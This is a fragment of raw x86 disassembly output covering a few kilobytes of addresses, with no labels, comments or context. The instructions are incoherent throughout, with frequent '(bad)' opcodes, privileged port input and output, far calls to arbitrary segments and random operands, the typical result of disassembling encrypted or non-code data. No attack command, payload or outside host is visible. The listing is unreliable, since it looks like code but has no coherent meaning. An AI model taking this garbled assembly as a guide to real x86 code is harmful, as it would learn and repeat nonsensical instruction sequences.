  41b2b5:	adc    esi,DWORD PTR [ebp-0x5cf860c0]
  41b2bb:	imul   eax,DWORD PTR ds:0x6921d4b1,0x7b
  41b2c2:	cmc    
  41b2c3:	shl    DWORD PTR [edi+0x49],1
  41b2c6:	les    ebx,FWORD PTR [edi]
  41b2c8:	sub    ch,bh
  41b2ca:	int    0x8b
  41b2cc:	lods   al,BYTE PTR ds:[esi]
  41b2cd:	jge    0x41b256
  41b2cf:	dec    edx
  41b2d0:	xchg   ebp,eax
  41b2d1:	or     cl,BYTE PTR [ebx]
  41b2d3:	fwait
  41b2d4:	call   0xde2a6d50
  41b2d9:	xor    DWORD PTR [eax+esi*1+0x76f463da],ebp
  41b2e0:	or     cl,BYTE PTR [esi-0x370dd13e]
  41b2e6:	es icebp 
  41b2e8:	xchg   esp,eax
  41b2e9:	and    DWORD PTR [edi+ebx*1+0x182ef8d1],esp
  41b2f0:	mov    esi,0x55698559
  41b2f5:	inc    esi
  41b2f6:	lods   eax,DWORD PTR ds:[esi]
  41b2f7:	or     dh,BYTE PTR [eax]
  41b2f9:	out    0x21,eax
  41b2fb:	cmp    ebp,0x78
  41b2fe:	in     al,dx
  41b2ff:	and    DWORD PTR ds:0xca69785a,eax
  41b305:	ins    BYTE PTR es:[edi],dx
  41b306:	out    dx,eax
  41b307:	sar    dh,cl
  41b309:	xor    edx,edi
  41b30b:	bndstx [esi-0x7a],(bad)
  41b30f:	(bad)  
  41b311:	add    bh,ch
  41b313:	(bad)  
  41b314:	je     0x41b2d3
  41b316:	in     eax,dx
  41b317:	pusha  
  41b318:	jg     0x41b375
  41b31a:	pushf  
  41b31b:	repz icebp 
  41b31d:	dec    edx
  41b31e:	in     al,0x63
  41b320:	(bad)  
  41b321:	sahf   
  41b322:	(bad)  
  41b323:	xor    al,0x2
  41b325:	enter  0x7623,0x27
  41b329:	fist   DWORD PTR [esi-0x7c]
  41b32c:	mov    eax,0x5d134e53
  41b331:	ins    BYTE PTR es:[edi],dx
  41b332:	pop    ss
  41b333:	(bad)  
  41b334:	shl    BYTE PTR [ebp+0x4a],cl
  41b337:	push   esp
  41b338:	pop    eax
  41b339:	pop    edx
  41b33a:	adc    dh,dl
  41b33c:	out    0xb2,eax
  41b33e:	rcl    BYTE PTR [eax+0x73],cl
  41b341:	push   ds
  41b342:	fwait
  41b343:	jb     0x41b2ff
  41b345:	mov    ss,WORD PTR [edi+0x56]
  41b348:	xchg   ecx,eax
  41b349:	jne    0x41b3a7
  41b34b:	xor    BYTE PTR [esi-0x65],dh
  41b34e:	inc    ecx
  41b34f:	in     al,0x5c
  41b351:	sets   BYTE PTR [ebp-0x6130e70d]
  41b358:	mov    eax,ds:0xce85c2d7
  41b35d:	gs out 0x3f,al
  41b360:	test   BYTE PTR [eax-0x43],bh
  41b363:	test   eax,0xac5d8889
  41b368:	aad    0x88
  41b36a:	push   ds
  41b36b:	addr16 jp 0x41b391
  41b36e:	xchg   ebp,eax
  41b36f:	arpl   sp,bp
  41b371:	mov    bh,0x81
  41b373:	and    al,BYTE PTR [ebx]
  41b375:	mov    edx,0xefe80b09
  41b37a:	icebp  
  41b37b:	mov    cl,0xc
  41b37d:	mov    bl,al
  41b37f:	mov    ch,0x6f
  41b381:	push   esi
  41b382:	xchg   esp,eax
  41b383:	xor    al,0xcf
  41b385:	(bad)  [edi+0x7aa0425c]
  41b38b:	mov    ebx,0x29d701e5
  41b390:	(bad)  
  41b391:	(bad)  
  41b392:	pusha  
  41b393:	or     DWORD PTR [ecx-0x66ad270d],0xf81021b3
  41b39d:	in     eax,dx
  41b39e:	and    al,0xd8
  41b3a0:	test   al,0x15
  41b3a2:	fld    st(7)
  41b3a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b3a5:	push   0xc1ab675d
  41b3aa:	jo     0x41b382
  41b3ac:	mov    dh,0x5f
  41b3ae:	cdq    
  41b3af:	adc    eax,0x7b78df9b
  41b3b4:	add    bh,BYTE PTR [ebx+0x1a]
  41b3b7:	sbb    ebp,DWORD PTR [ebx]
  41b3b9:	mov    esp,0xf0e15464
  41b3be:	mov    esp,0x11e58393
  41b3c3:	mov    esi,0xbf245df7
  41b3c8:	pop    edx
  41b3c9:	add    bh,ch
  41b3cb:	daa    
  41b3cc:	push   0x5f
  41b3ce:	loop   0x41b3c2
  41b3d0:	pop    ebx
  41b3d1:	mov    ah,0xad
  41b3d3:	or     BYTE PTR [eax+0x1b],0x98
  41b3d7:	jg     0x41b3fc
  41b3d9:	out    dx,eax
  41b3da:	inc    ebp
  41b3db:	sbb    al,0x23
  41b3dd:	outs   dx,BYTE PTR ds:[esi]
  41b3de:	mov    esp,0x4b97f127
  41b3e3:	(bad)  
  41b3e4:	mov    ah,0x8b
  41b3e6:	jns    0x41b428
  41b3e8:	aad    0xe1
  41b3ea:	adc    al,0x88
  41b3ec:	push   cs
  41b3ed:	add    bl,0xca
  41b3f0:	xchg   ebx,eax
  41b3f1:	sub    esp,ecx
  41b3f3:	popa   
  41b3f4:	iret   
  41b3f5:	mov    eax,ds:0xb0d440e7
  41b3fa:	scas   eax,DWORD PTR es:[edi]
  41b3fb:	lods   al,BYTE PTR ds:[esi]
  41b3fc:	stos   BYTE PTR es:[edi],al
  41b3fd:	sti    
  41b3fe:	les    edi,FWORD PTR [edx-0x28]
  41b401:	xlat   BYTE PTR ds:[ebx]
  41b402:	mov    bh,0x48
  41b404:	xor    bh,BYTE PTR [esi]
  41b406:	addr16 mov ds:0x92ef,al
  41b40a:	rcr    DWORD PTR [eax],cl
  41b40c:	retf   
  41b40d:	xchg   ebx,eax
  41b40e:	pop    esi
  41b40f:	add    eax,0x3eb8eaaf
  41b414:	daa    
  41b415:	xor    ebp,ebp
  41b417:	push   ebx
  41b418:	pop    esi
  41b419:	cmp    BYTE PTR [ecx],cl
  41b41b:	out    dx,al
  41b41c:	inc    edx
  41b41d:	jl     0x41b3da
  41b41f:	jmp    0xa8fd:0xaa8d0810
  41b426:	sti    
  41b427:	inc    ecx
  41b428:	pop    esp
  41b429:	sub    eax,0xf0272476
  41b42e:	scas   eax,DWORD PTR es:[edi]
  41b42f:	xor    BYTE PTR ds:[esi+0x5c],ah
  41b433:	or     al,0x47
  41b435:	xchg   esp,eax
  41b436:	cs and al,0x77
  41b439:	inc    esi
  41b43a:	nop
  41b43b:	push   ds
  41b43c:	jbe    0x41b497
  41b43e:	adc    eax,0x7bc0cf6d
  41b443:	mov    BYTE PTR [ebp+edi*1-0x523c6e5d],ch
  41b44a:	loop   0x41b3fe
  41b44c:	push   0x2b75ec33
  41b451:	arpl   WORD PTR ds:[ebx-0x15257aba],ax
  41b458:	mov    ebp,0xaf133194
  41b45d:	or     BYTE PTR [edx+0x5ae20a25],cl
  41b463:	call   0xee4f7f
  41b468:	in     eax,dx
  41b469:	mov    bh,dh
  41b46b:	push   ss
  41b46c:	xor    ebp,DWORD PTR [ebp-0x1f]
  41b46f:	inc    edx
  41b470:	call   0xee65:0x6687d370
  41b477:	sti    
  41b478:	push   esi
  41b479:	shr    ebx,1
  41b47b:	les    ebp,FWORD PTR [edx+0x2ef2c297]
  41b481:	mov    dh,0x70
  41b483:	loopne 0x41b430
  41b485:	adc    DWORD PTR [edx+0x6],esi
  41b488:	pushf  
  41b489:	sbb    al,0x85
  41b48b:	cli    
  41b48c:	(bad)  
  41b48d:	pop    es
  41b48e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b48f:	xor    DWORD PTR [ebp-0x5155314b],ebp
  41b495:	adc    BYTE PTR fs:[edx-0x4a],dl
  41b499:	push   edx
  41b49a:	(bad)  
  41b49b:	dec    edx
  41b49c:	add    al,0x1f
  41b49e:	add    DWORD PTR [edi+0x4d],edx
  41b4a1:	gs mov ebx,0xe0c3481b
  41b4a7:	pop    esp
  41b4a8:	loop   0x41b4ba
  41b4aa:	shr    DWORD PTR [edx-0x175d1833],cl
  41b4b0:	xchg   esi,eax
  41b4b1:	nop
  41b4b2:	test   al,0xdb
  41b4b4:	mov    al,0xd5
  41b4b6:	xchg   edi,eax
  41b4b7:	or     eax,ecx
  41b4b9:	jo     0x41b4e0
  41b4bb:	pop    ss
  41b4bc:	push   0x9d3759cb
  41b4c1:	mov    ch,0xda
  41b4c3:	lods   eax,DWORD PTR ds:[esi]
  41b4c4:	loope  0x41b51a
  41b4c6:	push   cs
  41b4c7:	test   BYTE PTR [eax-0x9f7e949],dh
  41b4cd:	lods   al,BYTE PTR ds:[esi]
  41b4ce:	jns    0x41b518
  41b4d0:	loope  0x41b4ab
  41b4d2:	pusha  
  41b4d3:	push   cs
  41b4d4:	ror    DWORD PTR [esi],cl
  41b4d6:	mov    DWORD PTR [edi],ebx
  41b4d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b4d9:	inc    eax
  41b4da:	push   ss
  41b4db:	leave  
  41b4dc:	jno    0x41b488
  41b4de:	xchg   edx,eax
  41b4df:	xor    DWORD PTR [ecx-0x5c],ecx
  41b4e2:	push   cs
  41b4e3:	mov    ch,BYTE PTR [esi-0x5bc9bcc1]
  41b4e9:	mov    ds:0xa5fb9ab8,al
  41b4ee:	pop    ss
  41b4ef:	sbb    edx,DWORD PTR [ebp+0x20]
  41b4f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b4f3:	clc    
  41b4f4:	pop    eax
  41b4f5:	pop    esp
  41b4f6:	push   esi
  41b4f7:	test   dh,cl
  41b4f9:	sti    
  41b4fa:	int3   
  41b4fb:	ins    DWORD PTR es:[edi],dx
  41b4fc:	add    ch,BYTE PTR [edi-0x63cdd4ff]
  41b502:	sub    BYTE PTR [eax+edx*4+0x49],dl
  41b506:	inc    edx
  41b507:	std    
  41b508:	lea    edi,[esi+0x60d6e2df]
  41b50e:	fs jno 0x41b510
  41b511:	mov    esi,0xc5ece4a8
  41b516:	test   eax,0xa8c8e878
  41b51b:	mov    eax,ss
  41b51d:	fldenv [esi-0x2a]
  41b520:	jnp    0x41b4d5
  41b522:	cli    
  41b523:	cmp    DWORD PTR [ebx-0x9f2cdeb],eax
  41b529:	push   0x5ec9e573
  41b52e:	xchg   ebp,eax
  41b52f:	mov    BYTE PTR [ecx+0x193349d0],cl
  41b535:	jmp    ebx
  41b537:	push   ecx
  41b538:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b539:	fs ret 
  41b53b:	pop    edx
  41b53c:	jl     0x41b5bd
  41b53e:	mov    al,0x9e
  41b540:	pop    ss
  41b541:	mov    cl,0x2f
  41b543:	dec    edx
  41b544:	out    dx,eax
  41b545:	scas   al,BYTE PTR es:[edi]
  41b546:	mov    ch,0xff
  41b548:	gs inc esp
  41b54a:	push   esp
  41b54b:	bswap  eax
  41b54d:	dec    edi
  41b54e:	call   0xff1f:0xc990587c
  41b555:	pop    es
  41b556:	mov    al,0x24
  41b558:	and    DWORD PTR [esi],ecx
  41b55a:	pop    esp
  41b55b:	pop    ebp
  41b55c:	push   eax
  41b55d:	repnz lods al,BYTE PTR ds:[esi]
  41b55f:	call   0x13e5:0x39045ca1
  41b566:	nop
  41b567:	mov    al,ds:0xa8f761f6
  41b56c:	inc    edi
  41b56d:	lods   eax,DWORD PTR ds:[esi]
  41b56e:	xchg   esp,eax
  41b56f:	bswap  esp
  41b571:	jo     0x41b571
  41b573:	pop    es
  41b574:	bound  esp,QWORD PTR [esi-0x7c2a63ab]
  41b57a:	push   esp
  41b57b:	lods   eax,DWORD PTR ds:[esi]
  41b57c:	fcmove st,st(5)
  41b57e:	sbb    edx,DWORD PTR ds:0xe684248d
  41b584:	xor    DWORD PTR cs:0xfa9cd14,esp
  41b58b:	inc    ecx
  41b58c:	mov    ebx,DWORD PTR [esi+edi*2+0x3e4b0a41]
  41b593:	mov    cl,0xe5
  41b595:	lock rcl DWORD PTR [eax],cl
  41b598:	mov    al,0x5b
  41b59a:	xor    edi,DWORD PTR [ecx+0x46]
  41b59d:	test   BYTE PTR [ecx],0xca
  41b5a0:	dec    ebp
  41b5a1:	push   eax
  41b5a2:	das    
  41b5a3:	xchg   ebp,eax
  41b5a4:	adc    DWORD PTR [eax-0x46],ebp
  41b5a7:	aam    0x73
  41b5a9:	pop    ebp
  41b5aa:	adc    DWORD PTR [ebp-0x65937ec2],edi
  41b5b0:	aaa    
  41b5b1:	popf   
  41b5b2:	cmp    eax,0x4689b67c
  41b5b7:	jp     0x41b596
  41b5b9:	cmp    cl,BYTE PTR [ebx]
  41b5bb:	idiv   BYTE PTR [ebp-0x93b0372]
  41b5c1:	pop    ebx
  41b5c2:	je     0x41b63b
  41b5c4:	cs in  eax,dx
  41b5c6:	add    DWORD PTR [ebx-0x45],eax
  41b5c9:	test   BYTE PTR cs:[ebp-0x4514c4bf],bl
  41b5d0:	mov    ss,esi
  41b5d2:	pop    esp
  41b5d3:	mov    ds:0x2aa25b3a,al
  41b5d8:	scas   eax,DWORD PTR es:[edi]
  41b5d9:	ja     0x41b5a1
  41b5db:	std    
  41b5dc:	inc    ebp
  41b5dd:	aaa    
  41b5de:	xor    esi,DWORD PTR ds:0xec8d4a30
  41b5e4:	cli    
  41b5e5:	call   0x14a43cf6
  41b5ea:	(bad)  
  41b5eb:	mov    ds:0x89b9ccec,al
  41b5f0:	xchg   ecx,eax
  41b5f1:	aam    0x21
  41b5f3:	inc    ecx
  41b5f4:	sub    cl,BYTE PTR [ecx+eiz*1-0x6]
  41b5f8:	imul   edi,DWORD PTR [ebx],0x4c6add8f
  41b5fe:	mov    ah,0xc1
  41b600:	push   ss
  41b601:	ret    
  41b602:	cmc    
  41b603:	jne    0x41b601
  41b605:	mov    bh,ch
  41b607:	test   DWORD PTR [edx+0x42],edi
  41b60a:	lods   al,BYTE PTR ds:[esi]
  41b60b:	std    
  41b60c:	scas   eax,DWORD PTR es:[edi]
  41b60d:	pop    ebx
  41b60e:	inc    esp
  41b60f:	icebp  
  41b610:	push   ss
  41b611:	lea    eax,[edi-0x1f115a04]
  41b617:	jo     0x41b5ec
  41b619:	dec    edx
  41b61a:	lahf   
  41b61b:	mov    bl,0x80
  41b61d:	push   0xfffffff9
  41b61f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b620:	jmp    0x67804d9e
  41b625:	aaa    
  41b626:	push   0xffffffca
  41b628:	jge    0x41b5c6
  41b62a:	lock push ebx
  41b62c:	sahf   
  41b62d:	bound  esp,QWORD PTR [edx]
  41b62f:	add    eax,0xdacceff2
  41b634:	fdivr  DWORD PTR [edi+0x26]
  41b637:	mov    bh,0xb6
  41b639:	outs   dx,DWORD PTR ds:[esi]
  41b63a:	push   cs
  41b63b:	test   eax,0x4ca0b3d6
  41b640:	adc    edx,edx
  41b642:	mov    al,ds:0xa6a754b8
  41b647:	and    BYTE PTR [edi-0x1a54dd6c],bl
  41b64d:	in     eax,0xe9
  41b64f:	dec    edx
  41b650:	mov    al,ds:0x25572319
  41b655:	adc    ah,cl
  41b657:	ds in  eax,0x7c
  41b65a:	iret   
  41b65b:	sbb    eax,0x1441fa91
  41b660:	fdiv   DWORD PTR [ecx]
  41b662:	mov    esi,0x4e606e67
  41b667:	adc    ch,BYTE PTR [esi-0x54fa0d90]
  41b66d:	ja     0x41b6da
  41b66f:	hlt    
  41b670:	out    0x8f,eax
  41b672:	jg     0x41b679
  41b674:	fld    TBYTE PTR [edi]
  41b676:	idiv   dh
  41b678:	rcr    BYTE PTR [ecx+0x3dc39df4],1
  41b67e:	cmp    ecx,eax
  41b680:	call   0xf069:0x61eb7491
  41b687:	mov    ds:0xb55edb0e,eax
  41b68c:	test   al,0x10
  41b68e:	sub    edi,ecx
  41b690:	mov    bh,0x39
  41b692:	jns    0x41b673
  41b694:	in     al,dx
  41b695:	jmp    0x41b65c
  41b697:	jp     0x41b6d7
  41b699:	mov    cl,0x69
  41b69b:	mov    dh,0x99
  41b69d:	lods   al,BYTE PTR ds:[esi]
  41b69e:	or     BYTE PTR [ecx],bl
  41b6a0:	or     eax,0x19eb2e37
  41b6a5:	cs mov eax,0x69f63dfc
  41b6ab:	enter  0x315e,0xc7
  41b6af:	pop    ss
  41b6b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b6b1:	jp     0x41b6d6
  41b6b3:	call   0xb775d281
  41b6b8:	push   edi
  41b6b9:	or     eax,0x53b967a8
  41b6be:	fisubr DWORD PTR [edi]
  41b6c0:	sub    eax,0x2d4d5149
  41b6c5:	iret   
  41b6c6:	cmp    al,BYTE PTR [eax-0x66]
  41b6c9:	mul    DWORD PTR [ebx+eiz*4]
  41b6cc:	mov    ch,0xf
  41b6ce:	enter  0x1dad,0x68
  41b6d2:	test   DWORD PTR [ecx],0x506632a9
  41b6d8:	mov    ebx,0x5b289ecf
  41b6dd:	pop    eax
  41b6de:	jae    0x41b683
  41b6e0:	inc    esp
  41b6e1:	daa    
  41b6e2:	(bad)  
  41b6e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b6e4:	test   BYTE PTR [edx-0x7a],dl
  41b6e7:	adc    DWORD PTR [eax+0x5f],ebp
  41b6ea:	cmp    ebp,DWORD PTR [edx-0x1c]
  41b6ed:	shr    BYTE PTR [ebx],1
  41b6ef:	add    DWORD PTR [ebx+ebp*1],0xa1d2367f
  41b6f6:	jmp    0x41b762
  41b6f8:	in     eax,0xf
  41b6fa:	in     al,0xd9
  41b6fc:	test   eax,0x2144f8de
  41b701:	jne    0x41b70f
  41b703:	test   DWORD PTR [ebx],edx
  41b705:	popf   
  41b706:	mov    ebp,?
  41b708:	cmp    eax,0xb5c16143
  41b70d:	push   edx
  41b70e:	jmp    0x41b75a
  41b710:	sub    ch,BYTE PTR [edi-0x1d]
  41b713:	(bad)  
  41b714:	lods   al,BYTE PTR ds:[esi]
  41b715:	leave  
  41b716:	lds    esp,FWORD PTR [eax+0x6a]
  41b719:	xlat   BYTE PTR ds:[ebx]
  41b71a:	mov    dl,0xe
  41b71c:	hlt    
  41b71d:	inc    esp
  41b71e:	imul   edx,DWORD PTR [edi],0xffffffed
  41b721:	shl    BYTE PTR [ebx+eax*1+0x6d8b42a],cl
  41b728:	outs   dx,BYTE PTR ds:[esi]
  41b729:	loope  0x41b759
  41b72b:	or     al,0x83
  41b72d:	push   edi
  41b72e:	mov    bl,0x20
  41b730:	adc    al,0x2e
  41b732:	cmp    ah,BYTE PTR [ebp-0x5fce3fbb]
  41b738:	ja     0x41b701
  41b73a:	dec    BYTE PTR [edi+0x1f0e1df2]
  41b740:	jge    0x41b73c
  41b742:	lods   al,BYTE PTR ds:[esi]
  41b743:	fisub  DWORD PTR [ecx]
  41b745:	xor    edx,edi
  41b747:	push   ebp
  41b748:	gs mov dh,0x97
  41b74b:	in     eax,0xbc
  41b74d:	add    eax,0x3fefd223
  41b752:	(bad)  
  41b753:	iret   
  41b754:	scas   eax,DWORD PTR es:[edi]
  41b755:	xchg   ebx,eax
  41b756:	scas   eax,DWORD PTR es:[edi]
  41b757:	mov    ah,BYTE PTR [eax+ecx*1-0x70]
  41b75b:	mov    esp,0x8bf97c92
  41b760:	dec    esi
  41b761:	out    0x18,eax
  41b763:	pop    ebp
  41b764:	pop    edx
  41b765:	std    
  41b766:	mul    ebp
  41b768:	inc    ecx
  41b769:	adc    BYTE PTR [ebx+0x1f6ab45a],al
  41b76f:	dec    eax
  41b770:	xchg   DWORD PTR [ebp+0x5],ebx
  41b773:	imul   ecx,edi,0x5e
  41b776:	inc    eax
  41b777:	xchg   edx,eax
  41b778:	call   DWORD PTR [esi]
  41b77a:	inc    edx
  41b77b:	xor    BYTE PTR [ecx+0x279d5724],cl
  41b781:	inc    edx
  41b782:	mov    eax,es:0x34ef89c0
  41b788:	scas   al,BYTE PTR es:[edi]
  41b789:	std    
  41b78a:	dec    eax
  41b78b:	test   al,0x64
  41b78d:	nop
  41b78e:	cmp    DWORD PTR [ebx],0xffffff96
  41b791:	mov    bl,0x9f
  41b793:	push   ebx
  41b794:	ins    DWORD PTR es:[edi],dx
  41b795:	mov    edi,0x72117d09
  41b79a:	jg     0x41b72f
  41b79c:	fimul  DWORD PTR [eax]
  41b79e:	xchg   BYTE PTR [ebx],dh
  41b7a0:	sub    al,0xb3
  41b7a2:	push   cs
  41b7a3:	into   
  41b7a4:	ins    BYTE PTR es:[edi],dx
  41b7a5:	fcmovbe st,st(3)
  41b7a7:	pop    ebp
  41b7a8:	test   BYTE PTR [ebx+edi*8],ch
  41b7ab:	inc    ecx
  41b7ac:	sub    eax,0xb8df1bf8
  41b7b1:	into   
  41b7b2:	and    ecx,DWORD PTR [edx+ecx*1-0x23efd0f0]
  41b7b9:	cmp    esi,ecx
  41b7bb:	hlt    
  41b7bc:	push   es
  41b7bd:	sti    
  41b7be:	adc    ecx,DWORD PTR [ebx-0x43864d1a]
  41b7c4:	jnp    0x41b7dc
  41b7c6:	mov    ds:0xbeeee5d8,eax
  41b7cb:	in     al,0xe7
  41b7cd:	ret    
  41b7ce:	inc    eax
  41b7cf:	dec    edi
  41b7d0:	nop
  41b7d1:	xchg   ebx,eax
  41b7d2:	and    ch,BYTE PTR [edx]
  41b7d4:	shl    BYTE PTR [ebp+0x6db02194],1
  41b7da:	iret   
  41b7db:	jmp    0x41b770
  41b7dd:	cli    
  41b7de:	xchg   esp,eax
  41b7df:	and    eax,DWORD PTR [eax+0x4d]
  41b7e2:	mov    ch,0x7d
  41b7e4:	jnp    0x41b81d
  41b7e6:	add    DWORD PTR [ebx-0x3a36b838],eax
  41b7ec:	gs and al,0xa
  41b7ef:	ins    DWORD PTR es:[edi],dx
  41b7f0:	loopne 0x41b7a7
  41b7f2:	inc    edi
  41b7f3:	or     ebx,DWORD PTR [ebx+eiz*1+0x46]
  41b7f7:	aam    0x67
  41b7f9:	pop    ss
  41b7fa:	and    BYTE PTR [ebx+0x471823fa],al
  41b800:	fbld   TBYTE PTR [ebp+0x1986119f]
  41b806:	data16 das 
  41b808:	mov    eax,0x75a2f8b4
  41b80d:	pop    esp
  41b80e:	jmp    0xb289ef53
  41b813:	mov    cl,0x3d
  41b815:	fsub   DWORD PTR [edx]
  41b817:	mov    ch,0x45
  41b819:	dec    ebp
  41b81a:	pop    ds
  41b81b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b81c:	add    ebx,ebp
  41b81e:	aam    0x1d
  41b820:	inc    edi
  41b821:	mov    edi,0xceb70ee8
  41b826:	in     eax,0xad
  41b828:	(bad)  
  41b829:	xchg   ebx,eax
  41b82a:	mov    ebx,0x4f238d91
  41b82f:	inc    esi
  41b830:	adc    eax,0x3fa1ed5a
  41b835:	fistp  QWORD PTR [ecx+eiz*4+0x37]
  41b83a:	std    
  41b83b:	lea    eax,[eax-0x3]
  41b83e:	iret   
  41b83f:	neg    DWORD PTR [eax-0x23]
  41b842:	xchg   ebp,eax
  41b843:	mov    ds,esi
  41b845:	loopne 0x41b844
  41b847:	push   ebx
  41b848:	test   edi,0x38685f58
  41b84e:	leave  
  41b84f:	rcl    BYTE PTR ds:0x7e4f8537,cl
  41b855:	inc    ebx
  41b856:	cmp    eax,0x92d1efd3
  41b85b:	sbb    al,BYTE PTR [ebx-0x77c6e6db]
  41b861:	daa    
  41b862:	jnp    0x41b805
  41b864:	sbb    BYTE PTR cs:[ebp+edi*2+0x2f],dl
  41b869:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b86a:	retf   0xf500
  41b86d:	mov    esi,esp
  41b86f:	adc    bh,bl
  41b871:	mov    dl,0xd3
  41b873:	and    ecx,DWORD PTR [edx+0x6b]
  41b876:	sub    BYTE PTR [esi-0x6d],0xe4
  41b87a:	fcom   QWORD PTR [ebp+0x33ff1cc2]
  41b880:	rol    DWORD PTR [esp+eax*1+0x5c],1
  41b884:	in     al,0xa4
  41b886:	popa   
  41b887:	xchg   DWORD PTR [eax+ebx*2+0xb],edx
  41b88b:	test   eax,0x27fee681
  41b890:	or     al,0x18
  41b892:	mov    ds:0x47c88d84,eax
  41b897:	and    bh,dl
  41b899:	xor    BYTE PTR [ebp+0x56],0xd4
  41b89d:	pop    ebp
  41b89e:	stc    
  41b89f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b8a0:	mov    ch,BYTE PTR [edx-0x4587f93b]
  41b8a6:	fwait
  41b8a7:	out    0x43,al
  41b8a9:	xor    DWORD PTR [edx],edi
  41b8ab:	cwde   
  41b8ac:	es (bad) 
  41b8ae:	aaa    
  41b8af:	sti    
  41b8b0:	int    0x3a
  41b8b2:	into   
  41b8b3:	rcr    esi,0x8d
  41b8b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b8b7:	sub    dl,BYTE PTR [edi+0xf5340c8]
  41b8bd:	push   ebp
  41b8be:	jecxz  0x41b8fc
  41b8c0:	fwait
  41b8c1:	inc    DWORD PTR [edx-0x4e6cb06d]
  41b8c7:	and    BYTE PTR [edi],0xa4
  41b8ca:	leave  
  41b8cb:	jne    0x41b934
  41b8cd:	cmp    BYTE PTR [edx-0x634467cb],cl
  41b8d3:	shl    BYTE PTR [eax],cl
  41b8d5:	and    DWORD PTR [esi+0x16],esi
  41b8d8:	or     al,0x0
  41b8da:	or     eax,0x9a6b9d2c
  41b8df:	ss pop ebx
  41b8e1:	xor    BYTE PTR [esi+0xd954dce],ah
  41b8e7:	dec    edx
  41b8e8:	or     edx,DWORD PTR [edi+0x7c525aeb]
  41b8ee:	cmp    BYTE PTR [ecx+0x145123dd],ah
  41b8f4:	fsubr  DWORD PTR [ecx-0xf]
  41b8f7:	out    0x8e,eax
  41b8f9:	je     0x41b953
  41b8fb:	out    dx,al
  41b8fc:	lods   al,BYTE PTR ds:[esi]
  41b8fd:	xchg   ebp,eax
  41b8fe:	inc    eax
  41b8ff:	push   eax
  41b900:	push   edi
  41b901:	pop    esi
  41b902:	xor    DWORD PTR ds:0x9c3833e0,0xb0637192
  41b90c:	and    BYTE PTR [edx+0x25],dh
  41b90f:	mov    eax,0x55ce47de
  41b914:	les    edi,FWORD PTR [ecx]
  41b916:	call   0xd9ef:0x2e388282
  41b91d:	loopne 0x41b8b3
  41b91f:	mul    DWORD PTR [ebx+0x13]
  41b922:	pop    ebx
  41b923:	pop    edi
  41b924:	inc    ecx
  41b925:	mov    eax,0x50a977d7
  41b92a:	ins    DWORD PTR es:[edi],dx
  41b92b:	aad    0xf1
  41b92d:	add    eax,DWORD PTR [eax]
  41b92f:	lahf   
  41b930:	sbb    al,0x82
  41b932:	mov    bh,0x77
  41b934:	aaa    
  41b935:	mov    ?,WORD PTR [ebx-0x362d0525]
  41b93b:	mov    bl,bh
  41b93d:	into   
  41b93e:	das    
  41b93f:	push   0x4acdc29a
  41b944:	lahf   
  41b945:	out    0x8e,al
  41b947:	adc    al,0x82
  41b949:	xchg   BYTE PTR [ecx+0x52b992e],al
  41b94f:	add    ebx,ecx
  41b951:	dec    edi
  41b952:	and    eax,0x8c231c74
  41b957:	outs   dx,DWORD PTR ds:[esi]
  41b958:	ds xchg ecx,eax
  41b95a:	imul   ebx,DWORD PTR [ebp-0x39],0xffffffec
  41b95e:	push   0x15f62a52
  41b963:	mov    ch,0xbb
  41b965:	jns    0x41b9d8
  41b967:	pushf  
  41b968:	daa    
  41b969:	xchg   edi,eax
  41b96a:	lock leave 
  41b96c:	jge    0x41b9c3
  41b96e:	(bad)  
  41b96f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b970:	jo     0x41b937
  41b972:	jmp    0xae72262f
  41b977:	mov    ch,0x3b
  41b979:	setg   BYTE PTR [esi-0x35]
  41b97d:	sahf   
  41b97e:	lock (bad) 
  41b980:	out    dx,eax
  41b981:	and    ch,BYTE PTR [esi+0x13]
  41b984:	pop    edx
  41b985:	push   ds
  41b986:	jmp    0x43bb1da
  41b98b:	mov    cl,0x57
  41b98d:	pop    edx
  41b98e:	call   0x4df3:0xb0e86b1
  41b995:	ins    BYTE PTR es:[edi],dx
  41b996:	and    esi,DWORD PTR [edi+0x4fbdad92]
  41b99c:	sub    dl,BYTE PTR [edx-0x31]
  41b99f:	xchg   edi,eax
  41b9a0:	shl    DWORD PTR [eax-0x7adb43a3],1
  41b9a6:	fisub  DWORD PTR [esi+0x65]
  41b9a9:	cmp    edx,esp
  41b9ab:	sahf   
  41b9ac:	xor    BYTE PTR [eax-0x2a],ah
  41b9af:	daa    
  41b9b0:	test   DWORD PTR [ebp+0x5],0x635caed
  41b9b7:	aad    0xb9
  41b9b9:	sub    DWORD PTR [edi*8+0x1c2b063],0x5478a12e
  41b9c4:	inc    ebp
  41b9c5:	sub    DWORD PTR [eax],0x41e9e642
  41b9cb:	je     0x41ba4b
  41b9cd:	adc    ch,ch
  41b9cf:	or     al,0x9f
  41b9d1:	cdq    
  41b9d2:	sub    cl,BYTE PTR [edi]
  41b9d4:	push   eax
  41b9d5:	and    eax,0x69b865c1
  41b9da:	test   al,0x58
  41b9dc:	xchg   ecx,eax
  41b9dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b9de:	pop    ds
  41b9df:	push   es
  41b9e0:	(bad)  
  41b9e1:	fpatan 
  41b9e3:	push   edi
  41b9e4:	aaa    
  41b9e5:	xchg   esi,eax
  41b9e6:	mov    ch,0x70
  41b9e8:	xor    esi,0xe70f7b4
  41b9ee:	sbb    ah,al
  41b9f0:	lods   al,BYTE PTR ds:[esi]
  41b9f1:	dec    esp
  41b9f2:	mov    al,ds:0x73253761
  41b9f7:	loop   0x41b994
  41b9f9:	pop    esi
  41b9fa:	push   ebx
  41b9fb:	repz pop ebp
  41b9fd:	inc    ecx
  41b9fe:	out    dx,al
  41b9ff:	inc    ah
  41ba01:	ja     0x41b9e5
  41ba03:	ss in  eax,dx
